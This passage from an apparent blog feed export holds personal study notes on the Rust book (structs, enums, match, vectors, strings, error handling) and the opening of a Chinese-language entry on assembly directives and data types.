class="hljs-keyword">let</span> age = <span class="hljs-number">27</span>;<br>    <span class="hljs-keyword">let</span> peter = Person &#123; name, age &#125;;<br><br>    <span class="hljs-comment">// Print debug struct</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;:?&#125;&quot;</span>, peter);<br><br><br>    <span class="hljs-comment">// Instantiate a `Point`</span><br>    <span class="hljs-keyword">let</span> point: Point = Point &#123; x: <span class="hljs-number">10.3</span>, y: <span class="hljs-number">0.4</span> &#125;;<br><br>    <span class="hljs-comment">// Access the fields of the point</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;point coordinates: (&#123;&#125;, &#123;&#125;)&quot;</span>, point.x, point.y);<br><br>    <span class="hljs-comment">// Make a new point by using struct update syntax to use the fields of our</span><br>    <span class="hljs-comment">// other one</span><br>    <span class="hljs-keyword">let</span> bottom_right = Point &#123; x: <span class="hljs-number">5.2</span>, ..point &#125;;<br><br>    <span class="hljs-comment">// `bottom_right.y` will be the same as `point.y` because we used that field</span><br>    <span class="hljs-comment">// from `point`</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;second point: (&#123;&#125;, &#123;&#125;)&quot;</span>, bottom_right.x, bottom_right.y);<br><br>    <span class="hljs-comment">// Destructure the point using a `let` binding</span><br>    <span class="hljs-keyword">let</span> Point &#123; x: left_edge, y: top_edge &#125; = point;<br><br>    <span class="hljs-keyword">let</span> _rectangle = Rectangle &#123;<br>        <span class="hljs-comment">// struct instantiation is an expression too</span><br>        top_left: Point &#123; x: left_edge, y: top_edge &#125;,<br>        bottom_right: bottom_right,<br>    &#125;;<br><br>    <span class="hljs-comment">// Instantiate a unit struct</span><br>    <span class="hljs-keyword">let</span> _unit = Unit;<br><br>    <span class="hljs-comment">// Instantiate a tuple struct</span><br>    <span class="hljs-keyword">let</span> pair = Pair(<span class="hljs-number">1</span>, <span class="hljs-number">0.1</span>);<br><br>    <span class="hljs-comment">// Access the fields of a tuple struct</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;pair contains &#123;:?&#125; and &#123;:?&#125;&quot;</span>, pair.<span class="hljs-number">0</span>, pair.<span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">// Destructure a tuple struct</span><br>    <span class="hljs-keyword">let</span> Pair(integer, decimal) = pair;<br><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;pair contains &#123;:?&#125; and &#123;:?&#125;&quot;</span>, integer, decimal);<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li>Refactoring with Structs: Adding More Meaning: <strong><u>use struct to wrap relative fields</u></strong> </li><li><strong>print the struct by <code>println!()</code></strong> will get an error, and because struct don’t have a provided implementation of <code>Display</code>, we can only use the <code>#[derived(Debug)]</code> just before the struct definition. Then use <code>“&#123;:?&#125;”</code> or <code>“&#123;:#?&#125;”</code> as the formatter.</li></ul><blockquote><p>Rust has provided a number of traits for us to use with the <code>derive</code> annotation that can add useful behavior to our custom types. Those traits and their behaviors are listed in <a href="https://doc.rust-lang.org/book/appendix-03-derivable-traits.html">Appendix C</a>. We’ll cover how to implement these traits with custom behavior as well as how to create your own traits in Chapter 10.</p></blockquote><h2 id="Method-syntax"><a href="#Method-syntax" class="headerlink" title="Method syntax"></a>Method syntax</h2><ul><li><p><a href="https://doc.rust-lang.org/book/ch05-03-method-syntax.html#method-syntax">definition</a> :they’re defined <strong>within the context of a struct</strong> (or an enum or a trait object) ……</p></li><li><p>intention: We’ve put all the things we can do with an instance of a type in one <code>impl</code> block rather than making future users of our code search for capabilities of <code>Rectangle</code> in various places in the library we provide.</p></li><li><p><em>automatic referencing and dereferencing</em> : when you call a method with <code>object.something()</code>, Rust automatically adds in <code>&amp;</code>, <code>&amp;mut</code>, or <code>*</code> so <code>object</code> matches the signature of the method. In other words, the following are the same:</p><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust">p1.distance(&amp;p2);<br>(&amp;p1).distance(&amp;p2);<br></code></pre></div></td></tr></table></figure></li><li><h3 id="Associated-Functions"><a href="#Associated-Functions" class="headerlink" title="Associated Functions"></a><a href="https://doc.rust-lang.org/book/ch05-03-method-syntax.html#associated-functions">Associated Functions</a></h3><ul><li><code>impl</code> blocks allow us to define functions within <code>impl</code> blocks that <em>don’t</em> take <code>self</code> as a parameter. The usage is just like <code>String::from</code>, often used in struct builder.</li></ul></li></ul><h1 id="Enums-and-Pattern-Matching"><a href="#Enums-and-Pattern-Matching" class="headerlink" title="Enums and Pattern Matching"></a><a href="https://doc.rust-lang.org/book/ch06-00-enums.html#enums-and-pattern-matching">Enums and Pattern Matching</a></h1><h2 id="enum"><a href="#enum" class="headerlink" title="enum"></a>enum</h2><ul><li><p>Defining an enum with variants such as the ones in Listing 6-2 is similar to defining different kinds of struct definitions, except the enum doesn’t use the <code>struct</code> keyword and all the variants are grouped together under the <code>Message</code> type.</p></li><li><p>we can define methods on struct and the enums.</p></li><li><p><a href="https://doc.rust-lang.org/book/ch06-01-defining-an-enum.html#the-option-enum-and-its-advantages-over-null-values">The <code>Option</code> Enum and Its Advantages Over Null Values</a></p><ul><li><p>As such, Rust does not have nulls, but it does have an enum that can encode the concept of a value being present or absent. This enum is <code>Option&lt;T&gt;</code> and it is <a href="https://doc.rust-lang.org/std/option/enum.Option.html">defined by the standard library</a> as follows:</p><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">Option</span></span>&lt;T&gt; &#123;<br>    <span class="hljs-literal">None</span>,<br>    <span class="hljs-literal">Some</span>(T),<br>&#125;<br></code></pre></div></td></tr></table></figure><p>The <code>&lt;T&gt;</code> syntax is generic type parameter.(就跟模板是一样的)</p></li><li><p>So why is having <code>Option&lt;T&gt;</code> any better than having null? In short, because <code>Option&lt;T&gt;</code> and <code>T</code> (where <code>T</code> can be any type) are <strong>different types</strong>, the common_used_operation won’t work.</p></li></ul></li></ul><h2 id="match"><a href="#match" class="headerlink" title="match"></a>match</h2><h3 id="Patterns-that-Bind-to-Values"><a href="#Patterns-that-Bind-to-Values" class="headerlink" title="Patterns that Bind to Values"></a><a href="https://doc.rust-lang.org/book/ch06-02-match.html#patterns-that-bind-to-values">Patterns that Bind to Values</a></h3><p>This is how we can extract values out of enum variants.</p><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-meta">#[derive(Debug)]</span> <span class="hljs-comment">// so we can inspect the state in a minute</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">UsState</span></span> &#123;<br>    Alabama,<br>    Alaska,<br>    <span class="hljs-comment">// --snip--</span><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">Coin</span></span> &#123;<br>    Penny,<br>    Nickel,<br>    Dime,<br>    Quarter(UsState),<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">value_in_cents</span></span>(coin: Coin) -&gt; <span class="hljs-built_in">u8</span> &#123; <span class="hljs-comment">//If we were to call value_in_cents(Coin::Quarter(UsState::Alaska))</span><br>    <span class="hljs-keyword">match</span> coin &#123;<br>        Coin::Penny =&gt; <span class="hljs-number">1</span>,<br>        Coin::Nickel =&gt; <span class="hljs-number">5</span>,<br>        Coin::Dime =&gt; <span class="hljs-number">10</span>,<br>        Coin::Quarter(state) =&gt; &#123; <span class="hljs-comment">//then we can use the state variable</span><br>            <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;State quarter from &#123;:?&#125;!&quot;</span>, state);<br>            <span class="hljs-number">25</span><br>&#125;&#125;&#125;<br></code></pre></div></td></tr></table></figure><h3 id="Matching-with-Option-lt-T-gt"><a href="#Matching-with-Option-lt-T-gt" class="headerlink" title="Matching with Option&lt;T&gt;"></a><a href="https://doc.rust-lang.org/book/ch06-02-match.html#matching-with-optiont">Matching with <code>Option&lt;T&gt;</code></a></h3><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">main</span></span>() &#123;<br>    <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">plus_one</span></span>(x: <span class="hljs-built_in">Option</span>&lt;<span class="hljs-built_in">i32</span>&gt;) -&gt; <span class="hljs-built_in">Option</span>&lt;<span class="hljs-built_in">i32</span>&gt; &#123;<br>        <span class="hljs-keyword">match</span> x &#123;<br>            <span class="hljs-literal">None</span> =&gt; <span class="hljs-literal">None</span>,<br>            <span class="hljs-literal">Some</span>(i) =&gt; <span class="hljs-literal">Some</span>(i + <span class="hljs-number">1</span>),<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">let</span> five = <span class="hljs-literal">Some</span>(<span class="hljs-number">5</span>);<br>    <span class="hljs-keyword">let</span> six = plus_one(five);<br>    <span class="hljs-keyword">let</span> none = plus_one(<span class="hljs-literal">None</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li><p>Combining <code>match</code> and enums is useful in many situations. You’ll see this pattern a lot in Rust code: </p><ol><li><code>match</code> against an enum, </li><li>bind a variable to the data inside, and then execute code based on it. </li></ol><p>It’s a bit tricky at first, but once you get used to it, <strong>you’ll wish you had it in all languages</strong>. It’s consistently a user favorite.</p></li></ul><h3 id="Matches-Are-Exhaustive"><a href="#Matches-Are-Exhaustive" class="headerlink" title="Matches Are Exhaustive"></a><a href="https://doc.rust-lang.org/book/ch06-02-match.html#matches-are-exhaustive">Matches Are Exhaustive</a></h3><ul><li>Matches in Rust are <em>exhaustive</em>: we must exhaust <u>every last possibility in order for the code to be valid</u>. Especially in the case of <code>Option&lt;T&gt;</code>, when Rust prevents us from forgetting to explicitly handle the <code>None</code> case, it protects us from assuming that we have a value when we might have null, thus making the billion-dollar mistake discussed earlier impossible.</li></ul><h3 id="The-Placeholder"><a href="#The-Placeholder" class="headerlink" title="The _ Placeholder"></a><a href="https://doc.rust-lang.org/book/ch06-02-match.html#the-_-placeholder">The <code>_</code> Placeholder</a></h3><ul><li>The <code>_</code> pattern will match any value.</li></ul><h2 id="Concise-Control-Flow-with-if-let"><a href="#Concise-Control-Flow-with-if-let" class="headerlink" title="Concise Control Flow with if let"></a><a href="https://doc.rust-lang.org/book/ch06-03-if-let.html#concise-control-flow-with-if-let">Concise Control Flow with <code>if let</code></a></h2><ul><li>In other words, you can think of <code>if let</code> as <strong>syntax sugar</strong> for a <code>match</code> that runs code when the value matches <strong>one pattern</strong> and then ignores all other values.</li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> some_u8_value = <span class="hljs-literal">Some</span>(<span class="hljs-number">0u8</span>);<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> <span class="hljs-literal">Some</span>(<span class="hljs-number">3</span>) = some_u8_value &#123;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;three&quot;</span>);<br>&#125;<span class="hljs-comment">// here can add an &quot;else&quot;</span><br><span class="hljs-comment">//equals</span><br><span class="hljs-keyword">match</span> some_u8_value &#123;<br>    <span class="hljs-literal">Some</span>(<span class="hljs-number">3</span>) =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;three&quot;</span>),<br>    _ =&gt; (),<br>&#125;<br></code></pre></div></td></tr></table></figure><h1 id="Managing-Growing-Projects-with-Packages-Crates-and-Modules"><a href="#Managing-Growing-Projects-with-Packages-Crates-and-Modules" class="headerlink" title="Managing Growing Projects with Packages, Crates, and Modules"></a><a href="https://doc.rust-lang.org/book/ch07-00-managing-growing-projects-with-packages-crates-and-modules.html#managing-growing-projects-with-packages-crates-and-modules">Managing Growing Projects with Packages, Crates, and Modules</a></h1><h1 id="Common-Collections"><a href="#Common-Collections" class="headerlink" title="Common Collections"></a><a href="https://doc.rust-lang.org/book/ch08-00-common-collections.html#common-collections">Common Collections</a></h1><h2 id="Vectors"><a href="#Vectors" class="headerlink" title="Vectors"></a><a href="https://doc.rust-lang.org/book/ch08-01-vectors.html#storing-lists-of-values-with-vectors">Vectors</a></h2><h3 id="common-operation"><a href="#common-operation" class="headerlink" title="common operation"></a>common operation</h3><ul><li>Rust provides the <code>vec!</code> macro for convenience. <code>let v = vec![1, 2, 3];</code>  or  <code>let v: Vec&lt;i32&gt; = Vec::new();</code></li><li>use .push() to add elements</li><li>Dropping a Vector Drops Its Elements</li><li>read elements<ul><li>First method is best used when you want your program to crash if there’s an attempt to access an element past the end of the vector.</li><li>When the <code>get</code> method is passed an index that is outside the vector, it returns <code>None</code> without panicking</li></ul></li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> v = <span class="hljs-built_in">vec!</span>[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>];<br><br><span class="hljs-keyword">let</span> does_not_exist = &amp;v[<span class="hljs-number">100</span>];<br><span class="hljs-keyword">let</span> does_not_exist = v.get(<span class="hljs-number">100</span>);<br></code></pre></div></td></tr></table></figure><ul><li>following code won’t work, because vec may be copied to a new place </li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> <span class="hljs-keyword">mut</span> v = <span class="hljs-built_in">vec!</span>[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>];<br><span class="hljs-keyword">let</span> first = &amp;v[<span class="hljs-number">0</span>];<br>v.push(<span class="hljs-number">6</span>);<br><span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;The first element is: &#123;&#125;&quot;</span>, first);<br></code></pre></div></td></tr></table></figure><ul><li>To change the value that the mutable reference refers to, we have to use the dereference operator (<code>*</code>) to get to the value in <code>i</code> before we can use the <code>+=</code> operator</li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> &amp;<span class="hljs-keyword">mut</span> v &#123;  <span class="hljs-comment">//let mut v = vec![100, 32, 57];</span><br>    *i += <span class="hljs-number">50</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="Using-an-Enum-to-Store-Multiple-Types"><a href="#Using-an-Enum-to-Store-Multiple-Types" class="headerlink" title="Using an Enum to Store Multiple Types"></a><a href="https://doc.rust-lang.org/book/ch08-01-vectors.html#using-an-enum-to-store-multiple-types">Using an Enum to Store Multiple Types</a></h3><ul><li>when we need to store elements of a different type in a vector, we can define and use an enum!</li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">SpreadsheetCell</span></span> &#123;<br>    Int(<span class="hljs-built_in">i32</span>),<br>    Float(<span class="hljs-built_in">f64</span>),<br>    Text(<span class="hljs-built_in">String</span>),<br>&#125;<br><span class="hljs-keyword">let</span> row = <span class="hljs-built_in">vec!</span>[<br>    SpreadsheetCell::Int(<span class="hljs-number">3</span>),<br>    SpreadsheetCell::Text(<span class="hljs-built_in">String</span>::from(<span class="hljs-string">&quot;blue&quot;</span>)),<br>    SpreadsheetCell::Float(<span class="hljs-number">10.12</span>),<br>];<br></code></pre></div></td></tr></table></figure><h2 id="string-DOC"><a href="#string-DOC" class="headerlink" title="string(DOC)"></a>string(<a href="https://doc.rust-lang.org/stable/std/string/struct.String.html">DOC</a>)</h2><ul><li>For that, we use the <code>to_string</code> method, which is available on <strong>any type</strong> that implements the <code>Display</code> trait, as string literals do. </li><li>we can find out that the implementation of string is Vec.</li></ul><h3 id="CREATE-A-NEW-STRING"><a href="#CREATE-A-NEW-STRING" class="headerlink" title="CREATE A NEW STRING"></a>CREATE A NEW STRING</h3><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><br><span class="hljs-keyword">let</span> <span class="hljs-keyword">mut</span> s = <span class="hljs-built_in">String</span>::new();<br><span class="hljs-keyword">let</span> data = <span class="hljs-string">&quot;initial contents&quot;</span>;<br><span class="hljs-keyword">let</span> s = data.to_string();<br><span class="hljs-comment">// the method also works on a literal directly:</span><br><span class="hljs-keyword">let</span> s = <span class="hljs-string">&quot;initial contents&quot;</span>.to_string();<br><span class="hljs-comment">// or you can:</span><br><span class="hljs-keyword">let</span> s = <span class="hljs-built_in">String</span>::from(<span class="hljs-string">&quot;initial contents&quot;</span>);<br><span class="hljs-comment">//strings are UTF-8 encoded, so we can include any properly encoded data, like:</span><br><span class="hljs-keyword">let</span> hello = <span class="hljs-built_in">String</span>::from(<span class="hljs-string">&quot;السلام عليكم&quot;</span>);<br><br><br></code></pre></div></td></tr></table></figure><h3 id="UPDATING-THE-STRING"><a href="#UPDATING-THE-STRING" class="headerlink" title="UPDATING THE STRING"></a>UPDATING THE STRING</h3><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust">s.push_str(<span class="hljs-string">&quot;initial&quot;</span>);<span class="hljs-comment">//it&#x27;s a method</span><br>s.push(<span class="hljs-string">&#x27;l&#x27;</span>);<span class="hljs-comment">//push single character and single quote</span><br>s = s1 + s2;<span class="hljs-comment">//the &#x27;+&#x27; operation use the add() method</span><br></code></pre></div></td></tr></table></figure><ul><li>pay attention to the ownership taking</li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> <span class="hljs-keyword">mut</span> s1 = <span class="hljs-built_in">String</span>::from(<span class="hljs-string">&quot;foo&quot;</span>);<br><span class="hljs-keyword">let</span> s2 = <span class="hljs-string">&quot;bar&quot;</span>;<br>s1.push_str(s2);<br><span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;s2 is &#123;&#125;&quot;</span>, s2);<br></code></pre></div></td></tr></table></figure><ul><li><em><strong>deref coercion</strong></em>: why does the first line compile ? Because Rust compiler can coerce <code>&amp;String</code> into a <code>&amp;str</code> </li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> s3 = s1 + &amp;s2;<span class="hljs-comment">//they are all strings, compiler turns &amp;s2 into &amp;s2[..], and s1 has been moved </span><br><br><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">add</span></span>(<span class="hljs-keyword">self</span>, s: &amp;<span class="hljs-built_in">str</span>) -&gt; <span class="hljs-built_in">String</span> &#123;<span class="hljs-comment">//add&#x27;s signature, s1 don&#x27;t have &#x27;&amp;&#x27; which will take the ownership</span><br></code></pre></div></td></tr></table></figure><ul><li>For more complicated string <strong>combining</strong>, we can use the <code>format!</code> macro</li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">main</span></span>() &#123;<br>    <span class="hljs-keyword">let</span> s1 = <span class="hljs-built_in">String</span>::from(<span class="hljs-string">&quot;tic&quot;</span>);<br>    <span class="hljs-keyword">let</span> s2 = <span class="hljs-built_in">String</span>::from(<span class="hljs-string">&quot;tac&quot;</span>);<br>    <span class="hljs-keyword">let</span> s3 = <span class="hljs-built_in">String</span>::from(<span class="hljs-string">&quot;toe&quot;</span>);<br><span class="hljs-comment">//format! macro uses references so that this call doesn’t take ownership of any of its parameters.</span><br>    <span class="hljs-keyword">let</span> s = <span class="hljs-built_in">format!</span>(<span class="hljs-string">&quot;&#123;&#125;-&#123;&#125;-&#123;&#125;&quot;</span>, s1, s2, s3);<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="INDEXING"><a href="#INDEXING" class="headerlink" title="INDEXING"></a>INDEXING</h3><ul><li>try to index will lead to an error, because String is a wrapper of Vec&lt;u8&gt; </li><li>You must use range syntax like :</li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> hello = <span class="hljs-string">&quot;Здравствуйте&quot;</span>;<br><span class="hljs-keyword">let</span> s = &amp;hello[<span class="hljs-number">0</span>..<span class="hljs-number">4</span>];<br></code></pre></div></td></tr></table></figure><p>​        But you can’t simply use the &amp;hello[0..1]  because index 1 is not a char boundary.</p><ul><li>Use for_in_ to iterating over strings.</li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;नमस्ते&quot;</span>.chars() &#123;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, c);<br>&#125;<br><span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;नमस्ते&quot;</span>.bytes() &#123;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, b);<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li>This trade-off exposes more of the complexity of strings than is apparent in other programming languages, but it prevents you from having to handle errors involving non-ASCII characters later in your development life cycle.</li></ul><h2 id="hash-map"><a href="#hash-map" class="headerlink" title="hash map"></a>hash map</h2><h1 id="Error-Handling"><a href="#Error-Handling" class="headerlink" title="Error Handling"></a><a href="https://doc.rust-lang.org/book/ch09-00-error-handling.html#error-handling">Error Handling</a></h1><ul><li>Rust group errors into two categories: <em>recoverable and unrecoverable errors</em>. Most languages don’t distinguish these two kinds of errors, using mechanism such as exceptions. Rust don’t have exceptions. Instead, it has the type <code>Result&lt;T, E&gt;</code> for recoverable errors and the <code>panic!</code> macro that stops execution when the program encounters an unrecoverable error.</li></ul>]]></content>
    
    
    <categories>
      
      <category>programming_language</category>
      
    </categories>
    
    
    <tags>
      
      <tag>programming_language</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Assembly Language</title>
    <link href="/2021-08/pwn-Assembly/"/>
    <url>/2021-08/pwn-Assembly/</url>
    
    <content type="html"><![CDATA[<h1 id="整这些有的没的不如看gas的官方文档"><a href="#整这些有的没的不如看gas的官方文档" class="headerlink" title="整这些有的没的不如看gas的官方文档"></a>整这些有的没的不如看gas的<a href="https://sourceware.org/binutils/docs-2.38/as/index.html">官方文档</a></h1><p>现在主要用到的就是gas, 所以整点gas基础的东西.</p><ul><li><strong>If the symbol begins with a letter the statement is an assembly language <em>instruction</em></strong>  </li><li></li></ul><hr><h1 id="汇编语言伪指令-最要命的"><a href="#汇编语言伪指令-最要命的" class="headerlink" title="汇编语言伪指令(最要命的"></a>汇编语言伪指令(最要命的</h1><blockquote><ul><li>伪指令 (directive) 是嵌入源代码中的命令，由汇编器识别和执行。伪指令不在运行时执行，但是它们可以定义变量、宏和子程序；为内存段分配名称，执行许多其他与汇编器相关的日常任务。</li><li>简单来说就是方便编程的指令 </li></ul></blockquote><h2 id="基本"><a href="#基本" class="headerlink" title="基本:"></a>基本:</h2><ul><li><code>.data     .code     .stack</code> 定义段(segment)</li><li><code>.model flat,stdcall</code>它告诉汇编程序用的是哪一种存储模式</li><li><code>.END</code>标记一个程序的结束</li></ul><h2 id="数据类型及伪指令"><a href="#数据类型及伪指令" class="headerlink" title="数据类型及伪指令"></a>数据类型及伪指令</h2><h3 id="数据定义"><a href="#数据定义" class="headerlink" title="数据定义"></a>数据定义</h3><table><thead><tr><th>类型</th><th>用法</th></tr></thead><tbody><tr><td>BYTE</td><td>8 位无符号整数，B 代表字节</td></tr><tr><td>SBYTE</td><td>8 位有符号整数，S 代表有符号</td></tr><tr><td>WORD</td><td>16 位无符号整数</td></tr><tr><td>SWORD</td><td>16 位有符号整数</td></tr><tr><td>DWORD</td><td>32 位无符号整数，D 代表双（字）</td></tr><tr><td>SDWORD</td><td>32 位有符号整数，SD 代表有符号双（字）</td></tr><tr><td>FWORD</td><td>48 位整数（保护模式中的远指针）</td></tr><tr><td>QWORD</td><td>64 位整数，Q 代表四（字）</td></tr><tr><td>TBYTE</td><td>80 位（10 字节）整数，T 代表 10 字节</td></tr><tr><td>REAL4</td><td>32 位（4 字节）IEEE 短实数</td></tr><tr><td>REAL8</td><td>64 位（8 字节）IEEE 长实数</td></tr><tr><td>REAL10</td><td>80 位（10 字节）IEEE 扩展实数</td></tr></tbody></table><p>还可以是传统数据定义伪指令，如下表所示。</p><table><thead><tr><th>伪指令</th><th>用法</th><th>伪指令</th><th>用法</th></tr></thead><tbody><tr><td>DB</td><td>8位整数</td><td>DQ</td><td>64 位整数或实数</td></tr><tr><td>DW</td><td>16 位整数</td><td>DT</td><td>定义 80 位（10 字节）整数</td></tr><tr><td>DD</td><td>32 位整数或实数</td><td></td><td></td></tr></tbody></table><p>初始化语句</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">[name] directive initializer [,initializer]...<br></code></pre></div></td></tr></table></figure><p>如果希望不对变量进行初始化（随机分配数值），可以用符号 ? 作为初始值, 所有数值都由汇编器来转成二进制数据</p><ul><li><p>BYTE and SBYTE</p><ul><li>多初始值定义数组</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">list BYTE 10,20,30,40<br>#甚至可以:<br>list BYTE 10,20,30,40<br>     BYTE 50,60,70,80<br>     BYTE 81,82,83,84<br></code></pre></div></td></tr></table></figure><ul><li>定义字符串: 使用BYTE, </li></ul><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">greeting1 BYTE &quot;Good 